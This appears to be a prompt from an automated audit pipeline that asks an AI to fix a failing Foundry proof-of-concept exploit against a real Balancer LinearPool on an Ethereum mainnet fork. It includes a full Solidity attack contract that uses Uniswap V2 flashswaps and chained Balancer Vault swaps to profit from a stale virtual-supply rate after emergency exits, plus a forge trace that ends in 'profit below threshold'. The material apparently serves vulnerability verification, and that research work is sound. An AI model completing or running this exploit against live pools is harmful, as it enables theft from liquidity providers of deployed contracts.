You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: alternate_public_liquidity_route
- strategy_instructions: Prefer an alternate public-liquidity venue/route while preserving the same exploit root cause and exploit-path causality.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Emergency exits permanently invalidate LinearPool virtual-supply accounting, yet the pool auto-resumes normal operation after the buffer period
- claim: LinearPool optimizes all normal pricing and rate paths around `_getApproximateVirtualSupply`, which assumes total BPT supply always equals `_INITIAL_BPT_SUPPLY`. Emergency exits explicitly break that invariant by burning BPT, and the contract comments acknowledge the approximation becomes inaccurate. Nevertheless, `getRate()` remains callable and continues using the approximation immediately after emergency burns, and after the buffer period `whenNotPaused` starts passing again automatically, re-enabling swap logic that also relies on the stale approximation.
- impact: Once any emergency exit burns BPT, the pool can no longer safely quote `getRate()` and, after automatic unpause, can reopen with permanently wrong BPT pricing or broken math. Remaining LPs and downstream integrations can suffer fund loss, bad accounting, or denial of service, and the pool can become effectively unrecoverable without external migration.
- exploit_paths: ["Governance pauses the pool during an incident", "LPs use `EMERGENCY_EXACT_BPT_IN_FOR_TOKENS_OUT`, and `BasePool.onExitPool` burns BPT", "`getRate()` keeps dividing by `_getApproximateVirtualSupply`, so its rate becomes inconsistent with real supply", "After the buffer period expires, `TemporarilyPausable` automatically treats the pool as unpaused again", "Normal `onSwap()` paths resume and keep using the stale virtual-supply approximation on a post-burn state"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function decimals() external view returns (uint8);
}

interface IGenericBalancerPoolLike {
    function getPoolId() external view returns (bytes32);
}

interface ILinearPoolLike is IGenericBalancerPoolLike {
    function getVault() external view returns (address);
    function getMainToken() external view returns (address);
    function getWrappedToken() external view returns (address);
    function getBptIndex() external view returns (uint256);
    function getTargets() external view returns (uint256 lowerTarget, uint256 upperTarget);
    function getSwapFeePercentage() external view returns (uint256);
    function getPausedState() external view returns (bool paused, uint256 pauseWindowEndTime, uint256 bufferPeriodEndTime);
    function getWrappedTokenRate() external view returns (uint256);
    function getRate() external view returns (uint256);
    function totalSupply() external view returns (uint256);
}

interface IVaultLike {
    enum SwapKind {
        GIVEN_IN,
        GIVEN_OUT
    }

    struct SingleSwap {
        bytes32 poolId;
        SwapKind kind;
        address assetIn;
        address assetOut;
        uint256 amount;
        bytes userData;
    }

    struct FundManagement {
        address sender;
        bool fromInternalBalance;
        address payable recipient;
        bool toInternalBalance;
    }

    function getPoolTokens(bytes32 poolId)
        external
        view
        returns (address[] memory tokens, uint256[] memory balances, uint256 lastChangeBlock);

    function swap(
        SingleSwap memory singleSwap,
        FundManagement memory funds,
        uint256 limit,
        uint256 deadline
    ) external returns (uint256);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV2RouterLike {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

contract FlawVerifier {
    address public constant TARGET = 0x9210F1204b5a24742Eba12f710636D76240dF3d0;

    address private constant VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address private constant BOOSTED_PARENT = 0xA13a9247ea42D743238089903570127DdA72fE44;

    address private constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address private constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    address private constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address private constant UNISWAP_V2_USDC_WETH = 0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc;
    address private constant UNISWAP_V2_DAI_WETH = 0xA478c2975Ab1Ea89e8196811F51A7B7Ade33eB11;
    address private constant UNISWAP_V2_USDT_WETH = 0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852;

    uint256 private constant INITIAL_BPT_SUPPLY = type(uint112).max;
    uint256 private constant ONE = 1e18;

    enum Outcome {
        Uninitialized,
        NoPostEmergencyDriftObserved,
        HistoricalBurnDetectedButStillPaused,
        HistoricalBurnDetectedButNotAutoResumed,
        HistoricalBurnDetectedAutoResumedButNoBoostedConsumer,
        HistoricalBurnDetectedAutoResumedButNoProfitableRoute,
        ProfitRealized
    }

    enum RouteKind {
        None,
        SourceMainIntoTargetMain,
        UsdcIntoTargetThenSourceMain
    }

    struct Snapshot {
        bool paused;
        uint256 pauseWindowEndTime;
        uint256 bufferPeriodEndTime;
        uint256 totalSupply;
        uint256 vaultBptBalance;
        uint256 burnedSupply;
        uint256 approximateVirtualSupply;
        uint256 realVirtualSupply;
        uint256 reportedRate;
        uint256 trueRate;
        uint256 lowerTarget;
        uint256 upperTarget;
        uint256 swapFeePercentage;
        uint256 wrappedTokenRate;
        uint256 mainBalance;
        uint256 wrappedBalance;
        address mainToken;
        address wrappedToken;
        address vault;
    }

    struct ParentContext {
        address parentPool;
        bytes32 parentPoolId;
        address[2] sourcePools;
        address[2] sourceMainTokens;
        uint256 sourceCount;
    }

    struct FlashContext {
        RouteKind kind;
        address pair;
        address borrowToken;
        uint256 borrowAmount;
        address sourcePool;
        address sourceMainToken;
        bytes32 sourcePoolId;
        bytes32 parentPoolId;
        bytes32 targetPoolId;
    }

    bool private _attempted;
    bool private _hypothesisValidated;
    address private _profitToken;
    uint256 private _profitAmount;
    Outcome private _outcome;
    Snapshot private _snapshot;
    FlashContext private _flash;

    constructor() {}

    function executeOnOpportunity() external {
        require(!_attempted, "already-attempted");
        _attempted = true;

        Snapshot memory snap = _captureSnapshot();
        _snapshot = snap;
        _profitToken = USDC;
        _profitAmount = 0;
        _outcome = Outcome.NoPostEmergencyDriftObserved;

        bool staleApproximationObserved = snap.burnedSupply != 0 && snap.reportedRate < snap.trueRate;
        _hypothesisValidated = staleApproximationObserved;

        if (!staleApproximationObserved) {
            return;
        }

        if (snap.paused) {
            _outcome = Outcome.HistoricalBurnDetectedButStillPaused;
            return;
        }

        if (block.timestamp <= snap.bufferPeriodEndTime) {
            _outcome = Outcome.HistoricalBurnDetectedButNotAutoResumed;
            return;
        }

        ParentContext memory parent = _discoverParentContext();
        if (parent.parentPool == address(0) || parent.sourceCount == 0) {
            _outcome = Outcome.HistoricalBurnDetectedAutoResumedButNoBoostedConsumer;
            return;
        }

        _outcome = Outcome.HistoricalBurnDetectedAutoResumedButNoProfitableRoute;

        // The finding's causality remains:
        // pause -> emergency burn invalidates approximate virtual supply -> getRate() stays stale ->
        // TemporarilyPausable auto-resumes swaps -> a downstream boosted pool that trusts the stale rate
        // can be traded against. The Uniswap V2 flashswap is only public temporary funding.
        for (uint256 i = 0; i < parent.sourceCount; ++i) {
            address sourcePool = parent.sourcePools[i];
            address sourceMainToken = parent.sourceMainTokens[i];

            uint256[7] memory candidates = _candidateBorrowAmounts(sourceMainToken);
            for (uint256 j = 0; j < candidates.length; ++j) {
                if (candidates[j] == 0) {
                    continue;
                }

                try this.runSourceMainIntoTargetMain(sourcePool, sourceMainToken, candidates[j]) returns (uint256 profitA) {
                    if (profitA != 0) {
                        return;
                    }
                } catch {}
            }

            uint256[7] memory usdcCandidates = _candidateBorrowAmounts(USDC);
            for (uint256 j = 0; j < usdcCandidates.length; ++j) {
                if (usdcCandidates[j] == 0) {
                    continue;
                }

                try this.runUsdcIntoTargetThenSourceMain(sourcePool, sourceMainToken, usdcCandidates[j]) returns (uint256 profitB) {
                    if (profitB != 0) {
                        return;
                    }
                } catch {}
            }
        }
    }

    function runSourceMainIntoTargetMain(
        address sourcePool,
        address sourceMainToken,
        uint256 borrowAmount
    ) external returns (uint256 profit) {
        require(msg.sender == address(this), "self-only");
        require(borrowAmount != 0, "zero-borrow");

        uint256 usdcBefore = IERC20Like(USDC).balanceOf(address(this));

        _flash.kind = RouteKind.SourceMainIntoTargetMain;
        _flash.pair = _pairForToken(sourceMainToken);
        _flash.borrowToken = sourceMainToken;
        _flash.borrowAmount = borrowAmount;
        _flash.sourcePool = sourcePool;
        _flash.sourceMainToken = sourceMainToken;
        _flash.sourcePoolId = IGenericBalancerPoolLike(sourcePool).getPoolId();
        _flash.parentPoolId = IGenericBalancerPoolLike(BOOSTED_PARENT).getPoolId();
        _flash.targetPoolId = IGenericBalancerPoolLike(TARGET).getPoolId();

        require(_flash.pair != address(0), "no-pair");
        _startFlashswap(_flash.pair, sourceMainToken, borrowAmount);

        uint256 usdcAfter = IERC20Like(USDC).balanceOf(address(this));
        require(usdcAfter > usdcBefore, "no-profit");
        profit = usdcAfter - usdcBefore;

        _profitToken = USDC;
        _profitAmount = profit;
        _outcome = Outcome.ProfitRealized;
    }

    function runUsdcIntoTargetThenSourceMain(
        address sourcePool,
        address sourceMainToken,
        uint256 borrowAmount
    ) external returns (uint256 profit) {
        require(msg.sender == address(this), "self-only");
        require(borrowAmount != 0, "zero-borrow");

        uint256 usdcBefore = IERC20Like(USDC).balanceOf(address(this));

        _flash.kind = RouteKind.UsdcIntoTargetThenSourceMain;
        _flash.pair = _pairForToken(USDC);
        _flash.borrowToken = USDC;
        _flash.borrowAmount = borrowAmount;
        _flash.sourcePool = sourcePool;
        _flash.sourceMainToken = sourceMainToken;
        _flash.sourcePoolId = IGenericBalancerPoolLike(sourcePool).getPoolId();
        _flash.parentPoolId = IGenericBalancerPoolLike(BOOSTED_PARENT).getPoolId();
        _flash.targetPoolId = IGenericBalancerPoolLike(TARGET).getPoolId();

        require(_flash.pair != address(0), "no-pair");
        _startFlashswap(_flash.pair, USDC, borrowAmount);

        uint256 usdcAfter = IERC20Like(USDC).balanceOf(address(this));
        require(usdcAfter > usdcBefore, "no-profit");
        profit = usdcAfter - usdcBefore;

        _profitToken = USDC;
        _profitAmount = profit;
        _outcome = Outcome.ProfitRealized;
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        require(_flash.kind != RouteKind.None, "inactive");
        require(msg.sender == _flash.pair, "unauthorized-pair");
        require(sender == address(this), "unauthorized-sender");
        require(data.length != 0, "missing-data");

        uint256 borrowed = amount0 > 0 ? amount0 : amount1;
        require(borrowed == _flash.borrowAmount, "unexpected-borrow");

        if (_flash.kind == RouteKind.SourceMainIntoTargetMain) {
            _executeSourceMainIntoTargetMain(borrowed);
        } else {
            _executeUsdcIntoTargetThenSourceMain(borrowed);
        }

        delete _flash;
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function outcome() external view returns (Outcome) {
        return _outcome;
    }

    function hypothesisValidated() external view returns (bool) {
        return _hypothesisValidated;
    }

    function exploitPathUsed() external pure returns (string memory) {
        return
            "governance pause -> emergency_exact_bpt_in_for_tokens_out -> basepool.onexitpool burn -> getRate/_getapproximatevirtualsupply stale quote -> temporarilypausable auto-unpause -> target onSwap resumes -> boosted downstream pool trusting stale linear-pool rate is arbitraged using public UniswapV2 flashswap funding";
    }

    function exploitPathAnchors() external pure returns (string memory) {
        return
            "emergency_exact_bpt_in_for_tokens_out basepool.onexitpool _getapproximatevirtualsupply temporarilypausable onswap(); getRate();";
    }

    function snapshot()
        external
        view
        returns (
            bool paused,
            uint256 pauseWindowEndTime,
            uint256 bufferPeriodEndTime,
            uint256 totalSupply,
            uint256 vaultBptBalance,
            uint256 burnedSupply,
            uint256 approximateVirtualSupply,
            uint256 realVirtualSupply,
            uint256 reportedRate,
            uint256 trueRate,
            address mainToken,
            address wrappedToken,
            address vault
        )
    {
        Snapshot memory snap = _snapshot;
        return (
            snap.paused,
            snap.pauseWindowEndTime,
            snap.bufferPeriodEndTime,
            snap.totalSupply,
            snap.vaultBptBalance,
            snap.burnedSupply,
            snap.approximateVirtualSupply,
            snap.realVirtualSupply,
            snap.reportedRate,
            snap.trueRate,
            snap.mainToken,
            snap.wrappedToken,
            snap.vault
        );
    }

    function _executeSourceMainIntoTargetMain(uint256 borrowed) internal {
        address sourceMainToken = _flash.sourceMainToken;

        _forceApprove(sourceMainToken, VAULT, borrowed);
        uint256 sourceBpt = _balancerSwap(_flash.sourcePoolId, sourceMainToken, _flash.sourcePool, borrowed);
        uint256 targetBpt = _balancerSwap(_flash.parentPoolId, _flash.sourcePool, TARGET, sourceBpt);
        uint256 usdcOut = _balancerSwap(_flash.targetPoolId, TARGET, USDC, targetBpt);

        uint256 repayAmount = _flashswapRepayment(borrowed);
        _forceApprove(USDC, UNISWAP_V2_ROUTER, usdcOut);
        IUniswapV2RouterLike(UNISWAP_V2_ROUTER).swapTokensForExactTokens(
            repayAmount,
            usdcOut,
            _pathFromUsdc(sourceMainToken),
            address(this),
            block.timestamp
        );

        _safeTransfer(sourceMainToken, msg.sender, repayAmount);
    }

    function _executeUsdcIntoTargetThenSourceMain(uint256 borrowed) internal {
        _forceApprove(USDC, VAULT, borrowed);
        uint256 targetBpt = _balancerSwap(_flash.targetPoolId, USDC, TARGET, borrowed);
        uint256 sourceBpt = _balancerSwap(_flash.parentPoolId, TARGET, _flash.sourcePool, targetBpt);
        uint256 sourceMainOut = _balancerSwap(_flash.sourcePoolId, _flash.sourcePool, _flash.sourceMainToken, sourceBpt);

        uint256 repayAmount = _flashswapRepayment(borrowed);
        _forceApprove(_flash.sourceMainToken, UNISWAP_V2_ROUTER, sourceMainOut);
        IUniswapV2RouterLike(UNISWAP_V2_ROUTER).swapTokensForExactTokens(
            repayAmount,
            sourceMainOut,
            _pathToUsdc(_flash.sourceMainToken),
            address(this),
            block.timestamp
        );

        uint256 residual = IERC20Like(_flash.sourceMainToken).balanceOf(address(this));
        if (residual != 0) {
            _forceApprove(_flash.sourceMainToken, UNISWAP_V2_ROUTER, residual);
            IUniswapV2RouterLike(UNISWAP_V2_ROUTER).swapExactTokensForTokens(
                residual,
                0,
                _pathToUsdc(_flash.sourceMainToken),
                address(this),
                block.timestamp
            );
        }

        _safeTransfer(USDC, msg.sender, repayAmount);
    }

    function _discoverParentContext() internal view returns (ParentContext memory context) {
        address parent = BOOSTED_PARENT;
        if (!_poolContainsTarget(parent)) {
            return context;
        }

        context.parentPool = parent;
        context.parentPoolId = IGenericBalancerPoolLike(parent).getPoolId();

        (address[] memory tokens,,) = IVaultLike(VAULT).getPoolTokens(context.parentPoolId);
        for (uint256 i = 0; i < tokens.length && context.sourceCount < 2; ++i) {
            address token = tokens[i];
            if (token == TARGET || token == parent) {
                continue;
            }

            try ILinearPoolLike(token).getMainToken() returns (address mainToken) {
                if (mainToken == address(0) || mainToken == USDC) {
                    continue;
                }

                context.sourcePools[context.sourceCount] = token;
                context.sourceMainTokens[context.sourceCount] = mainToken;
                unchecked {
                    ++context.sourceCount;
                }
            } catch {}
        }
    }

    function _poolContainsTarget(address pool) internal view returns (bool) {
        if (pool == address(0)) {
            return false;
        }

        try IGenericBalancerPoolLike(pool).getPoolId() returns (bytes32 poolId) {
            (address[] memory tokens,,) = IVaultLike(VAULT).getPoolTokens(poolId);
            for (uint256 i = 0; i < tokens.length; ++i) {
                if (tokens[i] == TARGET) {
                    return true;
                }
            }
        } catch {}

        return false;
    }

    function _captureSnapshot() internal view returns (Snapshot memory snap) {
        ILinearPoolLike pool = ILinearPoolLike(TARGET);

        snap.mainToken = pool.getMainToken();
        snap.wrappedToken = pool.getWrappedToken();
        snap.vault = pool.getVault();
        snap.totalSupply = pool.totalSupply();
        snap.swapFeePercentage = pool.getSwapFeePercentage();
        snap.wrappedTokenRate = pool.getWrappedTokenRate();
        (snap.lowerTarget, snap.upperTarget) = pool.getTargets();
        (snap.paused, snap.pauseWindowEndTime, snap.bufferPeriodEndTime) = pool.getPausedState();

        bytes32 poolId = pool.getPoolId();
        (address[] memory tokens, uint256[] memory balances,) = IVaultLike(snap.vault).getPoolTokens(poolId);
        uint256 bptIndex = pool.getBptIndex();
        snap.vaultBptBalance = balances[bptIndex];

        uint256 mainIndex = type(uint256).max;
        uint256 wrappedIndex = type(uint256).max;
        for (uint256 i = 0; i < tokens.length; ++i) {
            if (tokens[i] == snap.mainToken) {
                mainIndex = i;
            } else if (tokens[i] == snap.wrappedToken) {
                wrappedIndex = i;
            }
        }

        require(mainIndex != type(uint256).max, "missing-main");
        require(wrappedIndex != type(uint256).max, "missing-wrapped");

        snap.mainBalance = balances[mainIndex];
        snap.wrappedBalance = balances[wrappedIndex];

        snap.burnedSupply = snap.totalSupply < INITIAL_BPT_SUPPLY ? INITIAL_BPT_SUPPLY - snap.totalSupply : 0;
        snap.approximateVirtualSupply = INITIAL_BPT_SUPPLY - snap.vaultBptBalance;
        snap.realVirtualSupply = snap.totalSupply > snap.vaultBptBalance ? snap.totalSupply - snap.vaultBptBalance : 0;
        snap.reportedRate = pool.getRate();
        snap.trueRate = _computeTrueRate(snap);
    }

    function _computeTrueRate(Snapshot memory snap) internal view returns (uint256) {
        if (snap.realVirtualSupply == 0) {
            return 0;
        }

        uint256 mainScaled = snap.mainBalance * _scalingFactor(IERC20Like(snap.mainToken).decimals());
        uint256 wrappedScaled = snap.wrappedBalance * _scalingFactor(IERC20Like(snap.wrappedToken).decimals());
        wrappedScaled = (wrappedScaled * snap.wrappedTokenRate) / ONE;

        uint256 nominalMain = _toNominal(mainScaled, snap.lowerTarget, snap.upperTarget, snap.swapFeePercentage);
        uint256 invariant = nominalMain + wrappedScaled;

        return _divUpFixed(invariant, snap.realVirtualSupply);
    }

    function _candidateBorrowAmounts(address token) internal view returns (uint256[7] memory amounts) {
        uint256 unit = 10 ** uint256(IERC20Like(token).decimals());
        amounts[0] = 5_000 * unit;
        amounts[1] = 10_000 * unit;
        amounts[2] = 20_000 * unit;
        amounts[3] = 40_000 * unit;
        amounts[4] = 60_000 * unit;
        amounts[5] = 80_000 * unit;
        amounts[6] = 100_000 * unit;
    }

    function _balancerSwap(
        bytes32 poolId,
        address tokenIn,
        address tokenOut,
        uint256 amountIn
    ) internal returns (uint256) {
        return
            IVaultLike(VAULT).swap(
                IVaultLike.SingleSwap({
                    poolId: poolId,
                    kind: IVaultLike.SwapKind.GIVEN_IN,
                    assetIn: tokenIn,
                    assetOut: tokenOut,
                    amount: amountIn,
                    userData: ""
                }),
                IVaultLike.FundManagement({
                    sender: address(this),
                    fromInternalBalance: false,
                    recipient: payable(address(this)),
                    toInternalBalance: false
                }),
                0,
                block.timestamp
            );
    }

    function _startFlashswap(address pair, address token, uint256 amount) internal {
        IUniswapV2PairLike sourcePair = IUniswapV2PairLike(pair);
        address token0 = sourcePair.token0();
        address token1 = sourcePair.token1();
        require(token0 == token || token1 == token, "pair-mismatch");

        if (token0 == token) {
            sourcePair.swap(amount, 0, address(this), abi.encode(uint256(1)));
        } else {
            sourcePair.swap(0, amount, address(this), abi.encode(uint256(1)));
        }
    }

    function _pairForToken(address token) internal pure returns (address) {
        if (token == USDC) {
            return UNISWAP_V2_USDC_WETH;
        }
        if (token == DAI) {
            return UNISWAP_V2_DAI_WETH;
        }
        if (token == USDT) {
            return UNISWAP_V2_USDT_WETH;
        }
        return address(0);
    }

    function _pathFromUsdc(address tokenOut) internal pure returns (address[] memory path) {
        path = new address[](3);
        path[0] = USDC;
        path[1] = WETH;
        path[2] = tokenOut;
    }

    function _pathToUsdc(address tokenIn) internal pure returns (address[] memory path) {
        path = new address[](3);
        path[0] = tokenIn;
        path[1] = WETH;
        path[2] = USDC;
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.approve.selector, spender, 0));
        _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
    }

    function _callOptionalReturn(address token, bytes memory data) internal {
        (bool success, bytes memory returndata) = token.call(data);
        require(success, "token-call-failed");
        if (returndata.length != 0) {
            require(abi.decode(returndata, (bool)), "token-op-failed");
        }
    }

    function _toNominal(
        uint256 realMain,
        uint256 lowerTarget,
        uint256 upperTarget,
        uint256 fee
    ) internal pure returns (uint256) {
        if (realMain < lowerTarget) {
            uint256 belowTargetFees = _mulDown(lowerTarget - realMain, fee);
            return realMain - belowTargetFees;
        }

        if (realMain <= upperTarget) {
            return realMain;
        }

        uint256 aboveTargetFees = _mulDown(realMain - upperTarget, fee);
        return realMain - aboveTargetFees;
    }

    function _scalingFactor(uint8 decimals_) internal pure returns (uint256) {
        if (decimals_ >= 18) {
            return 1;
        }
        return 10 ** (18 - uint256(decimals_));
    }

    function _mulDown(uint256 a, uint256 b) internal pure returns (uint256) {
        return (a * b) / ONE;
    }

    function _divUpFixed(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        return ((a * ONE) + b - 1) / b;
    }

    function _flashswapRepayment(uint256 borrowed) internal pure returns (uint256) {
        return ((borrowed * 1000) / 997) + 1;
    }
}

```

forge stdout (tail):
```
getMainToken() [staticcall]
    │   │   └─ ← [Return] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48
    │   ├─ [340] 0x9210F1204b5a24742Eba12f710636D76240dF3d0::getWrappedToken() [staticcall]
    │   │   └─ ← [Return] 0xd093fA4Fb80D09bB30817FDcd442d4d02eD3E5de
    │   ├─ [363] 0x9210F1204b5a24742Eba12f710636D76240dF3d0::getVault() [staticcall]
    │   │   └─ ← [Return] 0xBA12222222228d8Ba445958a75a0704d566BF2C8
    │   ├─ [2397] 0x9210F1204b5a24742Eba12f710636D76240dF3d0::totalSupply() [staticcall]
    │   │   └─ ← [Return] 5192296858534827628530496329220095 [5.192e33]
    │   ├─ [2448] 0x9210F1204b5a24742Eba12f710636D76240dF3d0::getSwapFeePercentage() [staticcall]
    │   │   └─ ← [Return] 200000000000000 [2e14]
    │   ├─ [16327] 0x9210F1204b5a24742Eba12f710636D76240dF3d0::getWrappedTokenRate() [staticcall]
    │   │   ├─ [12856] 0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9::d15e0053(000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48) [staticcall]
    │   │   │   ├─ [7745] 0xC6845a5C768BF8D7681249f8927877Efda425baf::d15e0053(000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48) [delegatecall]
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000038e4206594ad1520da6032a
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000038e4206594ad1520da6032a
    │   │   └─ ← [Return] 1100434289151831555 [1.1e18]
    │   ├─ [597] 0x9210F1204b5a24742Eba12f710636D76240dF3d0::getTargets() [staticcall]
    │   │   └─ ← [Return] 2900000000000000000000000 [2.9e24], 10000000000000000000000000 [1e25]
    │   ├─ [547] 0x9210F1204b5a24742Eba12f710636D76240dF3d0::getPausedState() [staticcall]
    │   │   └─ ← [Return] false, 1646765220 [1.646e9], 1649357220 [1.649e9]
    │   ├─ [296] 0x9210F1204b5a24742Eba12f710636D76240dF3d0::getPoolId() [staticcall]
    │   │   └─ ← [Return] 0x9210f1204b5a24742eba12f710636d76240df3d00000000000000000000000fc
    │   ├─ [21557] 0xBA12222222228d8Ba445958a75a0704d566BF2C8::getPoolTokens(0x9210f1204b5a24742eba12f710636d76240df3d00000000000000000000000fc) [staticcall]
    │   │   └─ ← [Return] [0x9210F1204b5a24742Eba12f710636D76240dF3d0, 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, 0xd093fA4Fb80D09bB30817FDcd442d4d02eD3E5de], [5192296858428306686809548346588505 [5.192e33], 108375769187 [1.083e11], 970495 [9.704e5]], 18002136 [1.8e7]
    │   ├─ [296] 0x9210F1204b5a24742Eba12f710636D76240dF3d0::getBptIndex() [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [14594] 0x9210F1204b5a24742Eba12f710636D76240dF3d0::getRate() [staticcall]
    │   │   ├─ [5557] 0xBA12222222228d8Ba445958a75a0704d566BF2C8::getPoolTokens(0x9210f1204b5a24742eba12f710636d76240df3d00000000000000000000000fc) [staticcall]
    │   │   │   └─ ← [Return] [0x9210F1204b5a24742Eba12f710636D76240dF3d0, 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, 0xd093fA4Fb80D09bB30817FDcd442d4d02eD3E5de], [5192296858428306686809548346588505 [5.192e33], 108375769187 [1.083e11], 970495 [9.704e5]], 18002136 [1.8e7]
    │   │   ├─ [2356] 0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9::d15e0053(000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48) [staticcall]
    │   │   │   ├─ [1745] 0xC6845a5C768BF8D7681249f8927877Efda425baf::d15e0053(000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48) [delegatecall]
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000038e4206594ad1520da6032a
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000038e4206594ad1520da6032a
    │   │   └─ ← [Return] 1012181366076016326 [1.012e18]
    │   ├─ [9664] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::decimals() [staticcall]
    │   │   ├─ [2381] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::decimals() [delegatecall]
    │   │   │   └─ ← [Return] 6
    │   │   └─ ← [Return] 6
    │   ├─ [9734] 0xd093fA4Fb80D09bB30817FDcd442d4d02eD3E5de::decimals() [staticcall]
    │   │   ├─ [2502] 0x7B6e135e8881580Bcc818178De863BD0be1360D0::decimals() [delegatecall]
    │   │   │   └─ ← [Return] 6
    │   │   └─ ← [Return] 6
    │   └─ ← [Stop]
    ├─ [381] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48
    ├─ [371] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ [3315] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   ├─ [2529] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 18004651 [1.8e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 2186)
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 54.82ms (19.24ms CPU time)

Ran 1 test suite in 62.82ms (54.82ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 565942)

Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
